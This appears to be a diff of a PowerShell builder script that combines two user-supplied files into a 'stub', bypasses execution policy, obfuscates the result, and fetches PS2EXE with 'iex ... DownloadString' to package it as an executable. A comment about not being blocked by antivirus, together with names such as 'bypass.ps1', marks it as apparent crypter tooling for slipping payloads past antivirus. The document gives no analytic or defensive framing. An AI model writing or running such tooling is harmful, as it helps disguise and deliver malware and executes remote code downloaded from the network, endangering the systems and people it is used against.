@@ -1,6 +1,8 @@
 $url = "https://raw.githubusercontent.com/test1213145/powershell-obfuscation/main/powershell-obfuscation.ps1"
 $localPath = "powershell-obfuscation.ps1"
+
 Invoke-WebRequest -Uri $url -OutFile $localPath
+
 Set-ExecutionPolicy Bypass -Scope Process -Force
 
 function Get-Base64Content {
@@ -44,17 +46,23 @@ function Build-Script {
 
     $outputPath = "stub.ps1"
     Set-Content -Path $outputPath -Value $finalScript -Encoding UTF8
-    .\powershell-obfuscation.ps1 -f "$outputPath"
 
+    # Verify that the script is not blocked by antivirus
     Write-Host "Script built successfully. Output file: $outputPath"
 
-    # Download and run ps2exe to convert the script to an executable
-    iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MScholtes/PS2EXE/master/Module/ps2exe.ps1')
-    Invoke-ps2exe -inputFile "bypass.ps1" -outputFile "$outputPath.exe"
-    Write-Host "Executable created successfully. Output file: $outputPath.exe"
+    # Run the obfuscation script manually
+    .\powershell-obfuscation.ps1 -f "$outputPath"
+
+    # Ensure bypass.ps1 is created
+    if (Test-Path "bypass.ps1") {
+        iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MScholtes/PS2EXE/master/Module/ps2exe.ps1')
+        Invoke-ps2exe -inputFile "bypass.ps1" -outputFile "$outputPath.exe"
+        Write-Host "Executable created successfully. Output file: $outputPath.exe"
+    } else {
+        Write-Host "bypass.ps1 not found. Conversion to executable failed."
+    }
 }
 
-# Prompt for inputs
 $file1 = Read-Host "Enter the path for file1"
 $file2 = Read-Host "Enter the path for file2"
 $removeInput = Read-Host "Remove temporary files after execution? (true/false)"
